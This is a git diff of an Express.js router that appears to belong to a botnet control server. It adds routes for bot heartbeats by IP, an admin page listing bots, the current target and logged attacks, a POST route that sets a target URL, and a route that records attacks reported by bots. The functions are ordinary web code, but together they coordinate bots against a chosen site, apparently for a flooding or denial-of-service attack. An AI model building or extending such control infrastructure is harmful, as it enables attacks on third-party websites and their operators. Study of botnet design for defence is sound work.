@@ -7,9 +7,6 @@ const bots = require('../controllers/bots')
 
 const routes = express.Router()
 
-let botCount = 0
-let botIPs = []
-
 function middleware(req, res, next) {
   next()
 }
@@ -20,12 +17,18 @@ function router() {
   async function admin(req, res) {
     try {
       var botsArray = bots.getBots()
+      var target = bots.getTarget()
+      var attacks = bots.getAttacks()
+      debug(attacks)
       res.render('admin', {
         currentTime: moment().format('L, LTS'),
-        bots: botsArray
+        bots: botsArray,
+        target: target,
+        attacks: attacks
       })
     } catch (err) {
       console.log(err)
+      res.sendStatus(500)
     }
   }
 
@@ -48,35 +51,63 @@ function router() {
       }
     } catch (error) {
       console.log(error)
+      res.sendStatus(500)
     }
   }
-
-  async function attack(req, res) {
-
-  }
-
+  
+  
   async function heartbeat(req, res) {
     debug('HEARTBEAT')
     const { ip } = req.params
     try {
       var response = await bots.heartbeat(ip)
-      if (response) {
-        res.sendStatus(200)
-      } else {
-        res.send('Bot does not exist yet')
+      res.send(response)
+    } catch (error) {
+      console.log(error)
+      res.sendStatus(500)
+    }
+    
+  }
+  
+  async function target(req, res) {
+    let attack = req.get('user-agent')
+    debug(attack)
+    debug('TARGET URL: ', req.body.url)
+    const { url } = req.body
+    try {
+      var response = await bots.setTarget(url)
+      if (response === url) {
+        res.redirect('/admin')
       }
     } catch (error) {
       console.log(error)
+      res.sendStatus(500)
     }
-
   }
 
+  async function attack(req, res) {
+    let attack = req.get('user-agent')
+    // debug(req.useragent)
+    try {
+      var response = await bots.documentAttack(attack)
+      if (response) {
+        res.sendStatus(200)
+      } else {
+        res.sendStatus(403)
+      }
+    } catch (error) {
+      console.log(error)
+      res.sendStatus(500)
+    }
+  }
 
   routes.get('/admin', admin)
   routes.post('/landing', landing)
-  routes.get('/attack', attack)
   routes.get('/heartbeat/:ip', heartbeat)
   routes.get('/sendFile', sendFile)
+  routes.post('/target', target)
+  routes.get('/attack', attack)
+
 
   return routes
 }
